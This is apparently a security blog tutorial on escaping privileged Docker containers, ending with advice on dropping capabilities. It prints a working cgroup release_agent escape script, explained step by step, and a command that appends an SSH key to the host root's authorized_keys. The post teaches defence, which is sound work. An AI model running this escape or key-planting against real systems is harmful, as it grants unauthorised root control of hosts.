---
title: "Escaping Docker Privileged Containers"
categories:
  - System Security
---

Why you should not run Docker with the "privileged" flag.

Privileged Docker containers are containers that are run with the `--privileged` flag. Unlike regular containers, these containers have root privilege to the host machine.

Privileged containers are often used when the containers need direct hardware access to complete their tasks. However, privileged Docker containers can enable attackers to take over the host system. Today, let's look at how attackers can escape privileged containers.

## Finding an Exploitable Container

But how can we tell if we are in a privileged container in the first place?

### How can you tell if you're in a container?

cgroups stands for "control groups." It is a Linux feature that isolates resource usage and is what Docker uses to isolate containers. You can tell if you are in a container by checking the init process' control group at `/proc/1/cgroup`. If you are not located inside a container, the control group should be `/`. On the other hand, if you are inside a container, you should see `/docker/CONTAINER_ID` instead.

### How can you tell if a container is privileged?

Once you've determined that you are in a container, you need to determine if that container is privileged. The best way to do this is to run a command that requires the `--privileged` flag and see if it succeeds.

For example, you can try to add a dummy interface by using an `iproute2` command. This command requires the `NET_ADMIN` capability, which the container would have if it is privileged:

```bash
$ ip link add dummy0 type dummy
```

If this command runs successfully, you can conclude that the container has the `NET_ADMIN` capability. `NET_ADMIN` is part of the privileged capabilities set, and containers that don't have it are not privileged. You can clean up the `dummy0` link after this test by running this command:

```bash
ip link delete dummy0
```

## Container Escape

So how do you escape a privileged container? By using this script. This example and PoC were taken from the [Trail of Bits Blog](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/). Read the original post for a more detailed explanation of the PoC:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

This PoC works by exploiting cgroup's `release_agent` feature.

After the last process in a cgroup exits, a command used to remove abandoned cgroups runs. This command is specified in the `release_agent` file and it runs as root on the host machine. By default, this feature is disabled and the `release_agent` path is empty.

This exploit runs code through the `release_agent` file. We need to create a cgroup, specify its `release_agent` file, and trigger the `release_agent` by killing all the processes in the cgroup. The first line in the PoC creates a new group:

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

The next line enables the `release_agent` feature:

```bash
echo 1 > /tmp/cgrp/x/notify_on_release
```

Then, the next few lines write the path of our command file to the `release_agent` file:

```bash
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

We can then start writing to our command file. This script will execute the `ps aux` command and save it to the `/output` file. We also need to set the script's execute permission bits:

```bash
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```

Finally, trigger the attack by spawning a process that immediately ends inside the cgroup that we created. Our `release_agent` script will execute after the process ends. You can now read the output of `ps aux` on the host machine in the `/output` file:

```bash
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

You can use the PoC to execute arbitrary commands on the host system. For example, you can use it to write your SSH key to the root user's `authorized_keys` file:

```bash
cat id_dsa.pub >> /root/.ssh/authorized_keys
```

## Mitigation

How can you prevent this attack from happening? Instead of granting containers full access to the host system, you should give containers the individual "capabilities" they need.

Docker capabilities give developers granular control over the permissions of a container. Capabilities break down the permissions usually packaged into "root access" into individual permissions.

By default, Docker drops all capabilities of a container and requires capabilities to be added. You can drop or add capabilities with the `cap-drop` and `cap-add` flags.

```bash
--cap-drop=all
--cap-add=LIST_OF_CAPABILITIES
```

For example, instead of granting a container root access, you can grant it the `NET_BIND_SERVICE` capability if it needs to bind to a port lower than 1024. This flag will grant the container those capabilities:

```bash
--cap-add NET_BIND_SERVICE
```

## Conclusion

If possible, avoid running Docker containers with the `--privileged` flag. Privileged containers might allow attackers to break out of the container and gain control over the host system. Grant containers individual capabilities with the `--cap-add` flag instead.